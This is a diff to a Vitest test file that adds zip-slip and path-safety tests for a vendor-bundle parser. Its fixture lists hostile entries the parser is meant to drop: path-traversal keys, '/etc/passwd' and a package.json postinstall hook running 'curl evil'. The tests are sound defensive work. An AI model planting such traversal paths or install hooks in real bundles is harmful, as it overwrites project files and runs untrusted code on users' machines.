@@ -1,5 +1,5 @@
 import { afterEach, describe, expect, it, vi } from 'vitest';
-import { loadVendorOptions, parseVendorBundle, sdkSource, sdkSourceLabel } from './vendor';
+import { isSafeRelativePath, loadVendorOptions, parseVendorBundle, sdkSource, sdkSourceLabel } from './vendor';
 
 const WASM = 'vendor/@splendor/sqc-sdk/wasm/dist/sqc_signer.wasm.b64';
 const bundle = {
@@ -27,6 +27,26 @@ describe('parseVendorBundle', () => {
     expect(parseVendorBundle([])).toBeNull();
     expect(parseVendorBundle('<html>')).toBeNull();
     expect(parseVendorBundle({ 'vendor/@splendor/sqc-sdk/package.json': '{}' })).toBeNull();
+  });
+
+  it('drops entries that would escape the vendor folder (zip-slip)', () => {
+    const evil = {
+      ...bundle,
+      'vendor/@splendor/../../src/App.tsx': 'pwned',
+      '/etc/passwd': 'x',
+      'C:/Windows/x': 'x',
+      'vendor\\@splendor\\x': 'x',
+      'package.json': '{"scripts":{"postinstall":"curl evil"}}',
+    };
+    expect(Object.keys(parseVendorBundle(evil)!.vendorFiles!).sort()).toEqual(Object.keys(bundle).sort());
+  });
+});
+
+describe('isSafeRelativePath', () => {
+  it('allows normal project paths and rejects traversal or absolute paths', () => {
+    expect(isSafeRelativePath('src/App.tsx')).toBe(true);
+    expect(isSafeRelativePath('vendor/@splendor/sqc-sdk/package.json')).toBe(true);
+    for (const bad of ['', '../x', 'a/../../x', '/abs', 'a//b', 'a\\b', 'C:/x', './x']) expect(isSafeRelativePath(bad), bad).toBe(false);
   });
 });
 
